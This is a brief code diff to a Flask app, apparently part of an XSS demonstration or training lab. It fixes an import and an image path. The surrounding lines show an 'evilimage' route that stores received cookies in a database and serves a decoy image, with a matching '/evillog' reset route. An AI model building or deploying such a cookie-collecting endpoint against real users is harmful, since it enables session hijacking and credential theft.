@@ -1,4 +1,4 @@
-from flask import Blueprint, request, render_template, session, redirect
+from flask import Blueprint, request, render_template, session, redirect, send_file
 
 import sqlite3
 
@@ -98,7 +98,7 @@ def pageEvilimage():
 	c.execute('''INSERT OR IGNORE INTO evilimage(data) VALUES (?)''', (cookies,))
 	conn.commit()
 	c.close()
-	return send_file('static/evilimg.png', mimetype='image/png', as_attachment=False)
+	return send_file('static/img/evilimg.png', mimetype='image/png', as_attachment=False)
 	
 @app.route('/evillog/reset')
 def pageEvillogReset():
